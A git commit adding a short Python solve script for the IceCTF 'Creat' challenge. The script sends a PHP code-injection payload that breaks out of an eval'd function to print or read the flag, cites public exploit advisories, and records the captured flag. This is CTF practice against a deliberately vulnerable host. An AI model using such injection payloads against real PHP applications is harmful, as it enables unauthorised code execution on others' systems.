1d5fdf7e6344c52bb3bed807719ae2d12d9a93ab
aiviaghost <48349394+aiviaghost@users.noreply.github.com>
2020-12-31 02:06:13 +0100

    some solve scripts

---
+++ IceCTF/Creat/solve.py
@@ -0,0 +1,20 @@
+import requests
+
+def cleanhtml(raw_html): # https://stackoverflow.com/questions/9662346/python-code-to-remove-html-tags-from-a-string
+  import re
+  cleanr = re.compile('<.*?>|&([a-z0-9]+|#[0-9]{1,6}|#x[0-9a-f]{1,6});')
+  cleantext = re.sub(cleanr, '', raw_html)
+  return cleantext
+
+'''
+https://cxsecurity.com/issue/WLB-2008090063
+https://www.exploit-db.com/exploits/32417
+'''
+
+# payload = { "c" : 'return -1;}readfile("flag.php");/*'}
+payload = { "c" : 'return -1;}echo($flag);/*'}
+r = requests.post("http://www.web-creat.vuln.icec.tf/index.php", data=payload)
+
+print(cleanhtml(r.text))
+
+# flag: IceCTF{Code_injection_in_php_because_why_n0t}
